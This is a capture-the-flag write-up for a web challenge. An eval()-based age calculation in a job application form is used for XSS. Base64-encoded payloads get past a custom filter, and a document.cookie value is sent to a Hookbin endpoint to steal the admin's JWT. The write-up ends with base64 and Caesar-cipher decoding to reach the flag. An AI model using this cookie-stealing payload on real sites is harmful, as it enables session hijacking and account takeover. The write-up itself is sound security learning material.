# Job Offer

On exploring the site we know that there are routes to submit a site for review, login, signup and apply for a job.

The submit site route just accepts email and password just submits it. Also it says that they won't see it soon so there is no use.

Next in job application route we see there is an option to see employer's view and to submit directly. But on the employer's page we see that they are calculating age from date of birth. Also they are using a custom xss filter to remove unsafe html. But they are using `eval` to calculate age. We can exploit this feautre since we can control the string to be supplied to eval. But we cannot directly steal cookies as there is a xss filter.
On exploring we notice that we can encode our payload to base64 and perform xss.

We can make use of [Hookbin](https://hookbin.com/) to create free endpoint to capture our request.

Now we have to encode our payload

```javascript
document.location = `https://hookb.in/ENDPOINT?c=` + document.cookie;
```

We are using single backticks( \` ) instead of quotations( " ). This is done to ensure that the quotes of `eval` are not escaped in javascript code.

Encode the string using:

```javascript
btoa("document.location=`https://hookb.in/ENDPOINT?c=`+document.cookie");
```

We need to decode this before it has to be executed by `eval`. For that we use:

```javascript
eval(atob("BASE64 ENCODED TEXT"));
```

Now modify the html of date input to `type="text"` and supply the value as:

```javascript
eval(atob("BASE64 ENCODED TEXT")) - 1 - 1
```
After this we get the message that our application will soon be seen. When we refresh the Hookbin page we notice that we have got the jwt cookie of admin user. We now copy the cookie and visit the site again.  
There we see a link to a secret file. On viewing the file we can identify it is base64 encoded. On decoding it we get:
```python
import base64

f = open("encodedSec.txt","r")

base64_str = f.read()

base64_bytes = base64_str.encode("ascii")

while True:
    try:
        base64_bytes = base64.b64decode(base64_bytes)
    except:
        print(base64_bytes.decode("ascii"))
        break
```
Output
```
Robot has the key to unlock the Ceaser's secret:
sfnb_{wuvn_jqane_gumq_ujv_bayneqo}
```
This is a keyded Casar's cipher. The key is with the robot. We can find the key on the robots.txt file. On decoding with the secret we find the flag.
```
pctf_{dont_write_your_own_filters}
```
